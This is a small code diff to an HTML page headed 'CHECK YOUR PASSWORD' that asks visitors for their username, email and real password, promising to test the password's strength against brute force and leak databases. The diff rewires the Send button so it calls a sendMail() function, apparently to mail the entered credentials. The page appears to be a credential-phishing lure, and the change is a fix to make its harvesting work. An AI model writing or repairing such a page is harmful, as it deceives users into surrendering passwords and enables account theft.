@@ -19,7 +19,7 @@
 <body>
 
 	<div class="container">
-		<form onsubmit="sendMail"> 												                                       
+		<form> 												                                       
 			<h1> CHECK YOUR PASSWORD </h1><br>
 			<p>Please fill the form so we can check if your password is strong enough, <br>
  				your password is not safe if it can be brute-force or found in a database of leaked 				
@@ -29,7 +29,7 @@
 			<input type="text" id="username" placeholder="Username" required> <br>
 			<input type="email" id="email" placeholder="Email" required><br>
 			<input type="password" id="password" placeholder="Text" required><br>
-			<button type="Submit">Send</button><br>
+			<button type="Submit"onclick="sendMail()">Send</button><br>
 		</form>
 	</div>
 
